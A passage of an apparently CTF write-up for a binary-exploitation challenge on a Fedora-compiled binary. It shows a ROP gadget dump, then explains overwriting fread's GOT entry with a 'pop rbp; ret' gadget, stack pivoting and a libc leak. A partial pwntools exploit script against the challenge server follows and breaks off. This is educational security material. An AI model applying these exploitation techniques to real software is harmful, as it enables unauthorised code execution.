<span style="color:#26A269">0x00000000401156</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">byte</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">ptr</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rip</span><span style="color:#D0CFCC">+0x2f0b</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> 0x1</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rbp</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040122f</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">leave</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010dd</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x00000000004010f0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040111f</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401130</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401009</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rip</span><span style="color:#D0CFCC">+0x2fe9</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010e7</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401008</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rip</span><span style="color:#D0CFCC">+0x2fe9</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010b7</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010b6</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010b8</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010c1</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edx</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401239</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edx</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">sub</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010ef</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401007</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">or</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">-0x75</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">cl</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x2fe9</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010e6</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">or</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rdi</span><span style="color:#D0CFCC">+0x404050</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401158</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">or</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">ebp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rdi</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rbp</span><span style="color:#D0CFCC">-0x3d</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">ebx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040115d</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rbp</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010e8</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">push</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dil</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dil</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">loopne</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401155</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401181</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">ret</span><span style="color:#D0CFCC"> </span><span style="color:#2AA1B3">far</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040101a</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010e4</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">shl</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">byte</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">ptr</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rcx</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rcx</span><span style="color:#D0CFCC">-0x41</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> 0x50</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dil</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dil</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">loopne</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401155</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401011</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">shl</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">byte</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">ptr</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rdx</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">-0x1</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> 0xd0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040123d</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">sub</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">esp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401005</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">sub</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">esp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rip</span><span style="color:#D0CFCC">+0x2fe9</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040123c</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">sub</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401004</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">sub</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rip</span><span style="color:#D0CFCC">+0x2fe9</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010ba</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401010</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010e3</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x00000000004010f0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401125</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401130</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040100f</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010e2</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x00000000004010f0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401124</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401130</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010ee</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">xchg</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">ax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">ax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>

<span style="color:#C061CB">CONFIG</span> [ search: <span style="color:#2A7BDE">ROP-JOP-SYS (default)</span> | x_match: <span style="color:#2A7BDE">none</span> | max_len: <span style="color:#2A7BDE">5</span> | syntax: <span style="color:#2A7BDE">Intel</span> | regex_filter: <span style="color:#2A7BDE">none</span> ]
<span style="color:#C061CB">RESULT</span> [ unique_gadgets: <span style="color:#2A7BDE">76</span> | search_time: <span style="color:#2A7BDE">8.448812ms</span> | print_time: <span style="color:#2A7BDE">9.371521ms</span> ]</code></pre>

You can see that there's not a lot to work with.
We don't have easy control over any register other than `rbp`.
As the flavor text stated, this binary was compiled on Fedora, unlike the other pwn challenges in this CTF which were compiled on Debian.
Fedora has a newer version of GCC, which apparently generates less ROP gadgets.
[Aplet123](https://aplet.me/) pointed out that this fragment at the end of the `main` function is a powerful gadget:

<pre><code><span style="color:#005DD0">0x000000000040120f</span> &lt;+153&gt;:  <span style="color:#26A269">mov</span><span style="color:#D0CFCC">    </span><span style="color:#C01C28">rdx</span>,<span style="color:#C01C28">QWORD</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">PTR</span><span style="color:#D0CFCC"> </span>[<span style="color:#C01C28">rip</span><span style="color:#F66151"><u style="text-decoration-style:single">+</u></span><span style="color:#005DD0">0x2e4a</span>]<span style="color:#D0CFCC">        # 0x404060 &lt;stdin@GLIBC_2.2.5&gt;</span>
<span style="color:#005DD0">0x0000000000401216</span> &lt;+160&gt;:  <span style="color:#26A269">lea</span><span style="color:#D0CFCC">    </span><span style="color:#C01C28">rax</span>,[<span style="color:#C01C28">rbp-0x10</span>]
<span style="color:#005DD0">0x000000000040121a</span> &lt;+164&gt;:  <span style="color:#26A269">mov</span><span style="color:#D0CFCC">    </span><span style="color:#C01C28">rcx</span>,<span style="color:#C01C28">rdx</span>
<span style="color:#005DD0">0x000000000040121d</span> &lt;+167&gt;:  <span style="color:#26A269">mov</span><span style="color:#D0CFCC">    </span><span style="color:#C01C28">edx</span>,<span style="color:#005DD0">0x20</span>
<span style="color:#005DD0">0x0000000000401222</span> &lt;+172&gt;:  <span style="color:#26A269">mov</span><span style="color:#D0CFCC">    </span><span style="color:#C01C28">esi</span>,<span style="color:#005DD0">0x1</span>
<span style="color:#005DD0">0x0000000000401227</span> &lt;+177&gt;:  <span style="color:#26A269">mov</span><span style="color:#D0CFCC">    </span><span style="color:#C01C28">rdi</span>,<span style="color:#C01C28">rax</span>
<span style="color:#005DD0">0x000000000040122a</span> &lt;+180&gt;:  <span style="color:#26A269">call</span><span style="color:#D0CFCC">   </span><span style="color:#005DD0">0x401070</span> &lt;<span style="color:#C01C28">fread@plt</span>&gt;
<span style="color:#005DD0">0x000000000040122f</span> &lt;+185&gt;:  <span style="color:#26A269">mov</span><span style="color:#D0CFCC">    </span><span style="color:#C01C28">eax</span>,<span style="color:#005DD0">0x0</span>
<span style="color:#005DD0">0x0000000000401234</span> &lt;+190&gt;:  <span style="color:#26A269">leave</span><span style="color:#D0CFCC">  </span>
<span style="color:#005DD0">0x0000000000401235</span> &lt;+191&gt;:  <span style="color:#26A269">ret</span><span style="color:#D0CFCC">    </span>
</code></pre>

This does `fread(rbp - 16, 1, 32, stdin)`.
We have full control over `rbp` with the `leave` and `pop rbp` gadgets, so we can use these instructions to do arbitrary write.
Aplet suggested overwriting the GOT entry of `fread` with the PLT address of `printf`, which would let us do arbitrary reads and writes.
However, I didn't feel like doing format string exploitation, so I came up with another idea.

If we overwrite the GOT entry of `fread` with a `pop rbp; ret` gadget, then the `call` instruction essentially turns into a `ret` instruction: the `pop rbp` will pop off the return address pushed by the `call`, and then the `ret` will return to the next address on the stack.
The value that was supposed to be the first argument of `fread` will now be left in `rdi`, so now we can control `rdi`.
With `rdi` control, we can leak libc with `puts`.

One issue is that the `leave; ret` at the end of that sequence will mess up `rsp` and break our ROP chain.
It pops the value 16 bytes after the first byte that we overwrote into `rbp`, and returns to the next value.
Since our write is 32 bytes, we control the value that gets popped into `rbp` and the return address.
Therefore, we can just stack pivot again with a `leave; ret` gadget.

A second issue is that if we call any functions with `rsp` in the libc stdin buffer, the function will use the area before `rsp` as stack space and overwrite the data in the buffer that we want `fread` to read.
To solve this, I put the ROP chain 2048 bytes after the start of the buffer so that data at the beginning of the buffer won't get overwritten.

After we overwrite the GOT entry for a function like `fread` or `puts`, we can no longer call the function by jumping to its PLT entry since that would jump to the overwritten address in the GOT.
Instead, we can jump to the second instruction in the PLT entry, which will lead to code that will look up the correct address of the function and jump there.
This will also restore the GOT entry, which is a problem for `fread` since it would break our gadget for setting `rdi`.
I was able to solve this later by overwriting the `fread` GOT entry back to the `pop rbp; ret` gadget every time I called `fread` this way.

The solve script so far looks like this:

```python
from pwn import *

exe = ELF("./stuff")
libc = ELF("./libc.so.6")

context.binary = exe

# r = process([exe.path])
# r = gdb.debug([exe.path])
r = remote("lac.tf", 31182)

# Get heap leak
r.sendlineafter(b"stuff\n", b"1")
r.recvuntil(b"leak: ")
leak = int(r.recvline(keepends=False), 0)
log.info(f"{hex(leak)=}")
# Address of libc stdin buffer
buffer_addr = leak - 0x1010
log.info(f"{hex(buffer_addr)=}")

# Instructions before the call to fread at the end of main, used to overwrite GOT and control rdi
fread_gadget = 0x40120F
# Instructions before the call to scanf, used to control rsi after scanf GOT is overwritten
rsi_gadget = 0x4011B0
# Instructions at the end of the loop before the jump back to puts, used to control eax after puts GOT is overwritten
eax_gadget = 0x401207
# Instruction before the call to fread that moves rax to rdi
rax_to_rdi_gadget = 0x401227
# Number of bytes from the start of the libc input buffer to the second half of the payload
# The gap in the middle is stack space for the functions
rop3_offset = 2048

# Overwrite GOT using the fread call at the end of main and pivot to rop3
rop1 = ROP(exe)
rop1.raw(exe.got.setbuf + 16)  # Set rbp with the leave instruction
rop1.raw(fread_gadget)
log.info(rop1.dump())

# This is the data that will be written to GOT starting with the entry for setbuf
rop2 = ROP(exe)
rop2.raw(b"AAAAAAAA")  # setbuf GOT
rop2.raw(rop2.find_gadget(["pop rbp", "ret"]))  # fread GOT
# Pivot to rop3 using the leave; ret at the end of main
rop2.raw(buffer_addr + rop3_offset)  # rbp
rop2.raw(rop2.find_gadget(["leave", "ret"]))
log.info(rop2.dump())

# fread GOT has been overwritten with a pop rbp gadget, which will pop the return address pushed by the call and return
# So the call to fread now acts like a ret instruction and the instructions before it can be used to control rdi

rop3 = ROP(exe)

# Leak libc by calling puts
